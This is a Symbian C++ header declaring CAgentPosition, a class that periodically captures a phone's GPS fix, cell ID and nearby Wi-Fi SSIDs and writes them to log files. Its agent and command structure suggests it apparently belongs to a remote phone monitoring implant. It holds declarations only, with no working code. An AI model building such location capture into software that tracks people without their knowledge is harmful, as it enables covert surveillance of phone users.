/*
 ============================================================================
 Name		: AgentPosition.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentPosition declaration
 ============================================================================
 */

#ifndef AGENTPOSITION_H
#define AGENTPOSITION_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include "AbstractAgent.h"
#include "AdditionalDataStructs.h"
#include <HT\TimeOutTimer.h>
#include <HT\Phone.h>
#include <HT\GPSPosition.h>
#include <HT\Logging.h>
#include <wlanmgmtclient.h>     // wi-fi info


// CLASS DECLARATION

/**
 *  CAgentPosition
 * 
 */
class CAgentPosition : public CAbstractAgent, public MTimeOutNotifier, public MPositionerObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentPosition();

	/**
	 * Two-phased constructor.
	 */
	static CAgentPosition* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentPosition* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:
	// From MTimeOutNotifier
    virtual void TimerExpiredL(TAny* src);

    // From MPositionerObserver
	//virtual void HandleGPSPositionL(TPosition position);  //original MB
	virtual void HandleGPSPositionL(TPositionSatelliteInfo position);
	virtual void HandleGPSErrorL(TInt error);
	
	/**
	 * Gets the current CellID and returns the information as a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	HBufC8* GetCellIdBufferL();
	
	/**
	 * Parse the GPS information and gets them as a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	//HBufC8* GetGPSBufferL(TPosition pos);  // original MB
	HBufC8* GetGPSBufferL(TPositionSatelliteInfo pos);
	
	/**
	 * Gets the current WiFi info and returns the information as a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	HBufC8* GetWiFiBufferL(TLocationAdditionalData* additionalData);
		
	/**
	 * Retrieves SSID of current scanned network.
	 */
	TInt GetSSID(CWlanScanInfo *scanInfo, TDes8 &aSSID);
	
	/**
	 * Translate Symbian time into Windows Filetime.
	 * @return A TInt64 FILETIME timestamp.
	 */
	//TInt64 GetFiletime(TTime aCurrentUtcTime);
	
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentPosition();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	CTimeOutTimer* iTimer;
	TBool iCaptureGPS;
	TBool iCaptureCellId;
	TBool iCaptureWiFi;
	TBool iPollGPS;
	
	TBool iStopped;  //this is used internally to know if we have been stopped or not, please before modifying or relying on this, take care of similar state variable into AbstractQueueEndPoint::iCanReceive
	
	CPhone* iPhone;
	CGPSPosition* iGPS;
	TTimeIntervalSeconds iSecondsInterv;
	
	CLogFile*	iLogCell;
	CLogFile*	iLogGps;
	__FLOG_DECLARATION_MEMBER
	};

#endif // AGENTPOSITION_H
